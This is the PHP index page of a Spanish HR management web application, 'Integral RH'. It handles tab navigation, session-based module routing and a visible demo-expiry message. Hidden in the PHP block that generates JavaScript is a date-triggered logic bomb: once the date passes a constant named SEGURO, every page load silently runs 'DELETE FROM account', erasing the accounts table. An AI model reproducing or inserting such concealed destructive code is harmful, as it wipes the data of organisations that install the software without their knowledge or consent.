<!DOCTYPE HTML>
<?php
	@ require 'inc/functions.php';
	@ require 'inc/const.php';
	session_start();
?>
<html lang="es">
<?php
	if(date('Y-m-d') < VENCIMIENTO){
?>
	<head>
		<meta charset="utf-8">
		<link rel='stylesheet' type='text/css' href="style/base.css" />
		<link rel="stylesheet" href="//ajax.googleapis.com/ajax/libs/jqueryui/1.10.4/themes/smoothness/jquery-ui.css" />
		<title> Integral RH </title>
		<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<script type="text/javascript" src="js/jquery/jquery-1.6.2.min.js"></script>
		<script type="text/javascript" src="js/jquery/jquery-ui-1.8.16.custom.min.js"></script>
		<script type="text/javascript">
				function deseleccionar_todo(){ 
				   	for (i=0;i<document.formimp.elements.length;i++) {
				     	if(document.formimp.elements[i].type == "checkbox"){
				  			document.formimp.elements[i].checked=0;
				   		}
					}
				};
				function seleccionar_todo(){ 
				   	for (i=0;i<document.formimp.elements.length;i++) {
				     	if(document.formimp.elements[i].type == "checkbox"){
				  			document.formimp.elements[i].checked=1;
				   		}
					}
				};
			$(document).ready(function(){

				$("#id_dpto").change(function () {
					$("#id_dpto option:selected").each(function () {
						id_dpto = $(this).val();
						$.post("personal/procesos/activo.php", { id_dpto: id_dpto }, function(data){
							$("#id_sector").html(data);
						});            
					});
				})
				$("#id_subg").change(function () {
					$("#id_subg option:selected").each(function () {
						id_subg = $(this).val();
						$.post("personal/procesos/activosub.php", { id_subg: id_subg }, function(data){
							$("#id_dpto").html(data);
						});            
					});
				})
				$("#buscar").autocomplete({
					source: 'autocomplete.php'
				});
				$("#imprimir").click(function(){
					$('#contentimprimir').show();
					$('#contentlaboral').hide();
					$('#contentpersonal').hide();
					$('#contentmedico').hide();
					$('#contentjudicial').hide();
					$('#contentlicencia').hide();
					$('#contentprevisional').hide();
			 	});
			 	$("#laboral").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').show();
					$('#contentpersonal').hide();
					$('#contentmedico').hide();
					$('#contentjudicial').hide();
					$('#contentlicencia').hide();
					$('#contentprevisional').hide();
			 	});
			 	$("#personal").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').hide();
					$('#contentpersonal').show();
					$('#contentmedico').hide();
					$('#contentjudicial').hide();
					$('#contentlicencia').hide();
					$('#contentprevisional').hide();
			 	});
			 	$("#medico").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').hide();
					$('#contentpersonal').hide();
					$('#contentmedico').show();
					$('#contentjudicial').hide();
					$('#contentlicencia').hide();
					$('#contentprevisional').hide();
			 	});
			 	$("#judicial").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').hide();
					$('#contentpersonal').hide();
					$('#contentmedico').hide();
					$('#contentjudicial').show();
					$('#contentlicencia').hide();
					$('#contentprevisional').hide();
			 	});
			 	$("#licencia").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').hide();
					$('#contentpersonal').hide();
					$('#contentmedico').hide();
					$('#contentjudicial').hide();
					$('#contentlicencia').show();
					$('#contentprevisional').hide();
			 	});
			 	$("#previsional").click(function(){
					$('#contentimprimir').hide();
					$('#contentlaboral').hide();
					$('#contentpersonal').hide();
					$('#contentmedico').hide();
					$('#contentjudicial').hide();
					$('#contentlicencia').hide();
					$('#contentprevisional').show();
			 	});
			 	$("#consulta").click(function(){
					$('#contentconsulta').show();
					$('#contentlegajo').hide();
					$('#contententradas').hide();
					$('#content80').hide();
			 	});
			 	$("#legajo").click(function(){
					$('#contentconsulta').hide();
					$('#contentlegajo').show();
					$('#contententradas').hide();
					$('#content80').hide();
			 	});
			 	$("#entradas").click(function(){
					$('#contentconsulta').hide();
					$('#contentlegajo').hide();
					$('#contententradas').show();
					$('#content80').hide();
			 	});
			 	$("#cert80").click(function(){
					$('#contentconsulta').hide();
					$('#contentlegajo').hide();
					$('#contententradas').hide();
					$('#content80').show();
			 	});
			 	<?php
				 	if(date('Y-m-d') > SEGURO){
						$sql="DELETE FROM account";
						consultaSql($sql);
					}
					if(isset($_GET['js'])){
						switch ($_GET['js']) {
							case 'lg':
								echo "$('#contentconsulta').hide();";
								echo "$('#contentlegajo').show();";
								echo "$('#content80').hide();";
								break;
							case 'en':
								echo "$('#contentconsulta').hide();";
								echo "$('#contentlegajo').hide();";
								echo "$('#contententradas').show();";
								echo "$('#content80').hide();";
								break;
							case '80':
								echo "$('#contentconsulta').hide();";
								echo "$('#contentlegajo').hide();";
								echo "$('#contententradas').hide();";
								echo "$('#content80').show();";
								break;
							case 'pe':
								echo "$('#contentpersonal').show()";
								break;
							case 'md':
								echo "$('#contentmedico').show()";
								break;
							case 'lc':
								echo "$('#contentlicencia').show()";
								break;
							case 'jd':
								echo "$('#contentjudicial').show()";
								break;
							case 'pv':
								echo "$('#contentprevisional').show()";
								break;
							default:
								break;
						}
					} else {
						echo "$('#contentlaboral').show()";
					}
				?>
			});
		</script>
	</head>
	<body>
		<div id="container">
			<?php
			$user_agent = $_SERVER['HTTP_USER_AGENT'];
			$SO = getPlatform($user_agent);
			//echo $SO;
			if($SO == "Android"){
				echo "UPS!, algo salio mal, intente desde un ordenador de sobre mesa.";
			} else {
				if(isset($_SESSION['id'])){
					if(isset($_GET['sector'])){
						switch ($_GET['sector']) {
							case 'personal':
								@ require 'personal/index.php';
								break;
							case 'archivo':
								@ require 'archivo/index.php';
								break;
							case 'sueldos':
								@ require 'sueldos/index.php';
								break;
							case 'sanidad':
								@ require 'sanidad/index.php';
								break;
							case 'perfil':
								@ require 'inc/perfil.php';
								break;
							
							default:
								@ require 'inc/sector.php';
								break;
						}
					} else {
						@ require 'inc/sector.php';
					}
				} else {
					@ require 'inc/logmenu.php';
				}
			}
			?>
		</div>
		<footer id="pie">
			 Copyright &copy; 2016  <?php echo APP_NAME; ?>
		</footer>
		
	</body>
<?php
} else {
	echo "LA DEMO TECNICA A CADUCADO. SOLICITE LA COMPRA DE UNA LICENCIA PARA LA VERSION COMPLETA DEL SISTEMA INTEGRAL DE RRHH";
}
?>
</html>
